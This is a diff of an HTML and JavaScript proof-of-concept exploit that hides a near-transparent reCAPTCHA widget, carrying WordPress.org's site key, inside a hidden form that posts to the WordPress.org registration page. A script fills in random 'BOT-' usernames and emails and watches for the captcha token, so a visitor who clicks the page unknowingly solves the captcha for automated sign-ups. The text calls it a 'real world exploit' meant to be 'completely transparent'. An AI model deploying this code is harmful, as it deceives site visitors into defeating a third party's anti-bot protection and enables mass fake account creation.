@@ -1,15 +1,11 @@
 <meta name="referrer" content="never">
-
 <script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=2'></script>
-
 <form method="post" action="https://wordpress.org/support/register.php">
 <div style="opacity:0.1" class="g-recaptcha" data-sitekey="6Ld6gcoSAAAAAEkCxPeS-_sqEokNIHwNCOtx17xo"></div>
-
-       <input name="user_login" type="hidden" id="user_login" size="30" maxlength="30" value="" />
-          <input name="user_email" id="user_email" type="hidden" value="" />
-      </form>
-In the real exploit it will be completely transparent. Make a click!
-
+<input name="user_login" type="hidden" id="user_login" size="30" maxlength="30" value="" />
+<input name="user_email" id="user_email" type="hidden" value="" />
+</form>
+In the real world exploit it will be completely transparent. Make a click! If you see "Invalid domain for site key" you're using an old browser. If you start getting a challenge - you're not a Good guy anymore :(
 
 <script>
 function makeid()
@@ -24,7 +20,7 @@ function makeid()
 }
 user_login.value='BOT-'+makeid();
 user_email.value='BOT-'+makeid()+'@gmail.com';
-user_login.value='BOT-'+makeid();
+
 
 check = setInterval(function(){
   v=document.getElementById('g-recaptcha-response').value
@@ -34,5 +30,4 @@ check = setInterval(function(){
     clearInterval(check);
   }
 },400)
-
 </script>
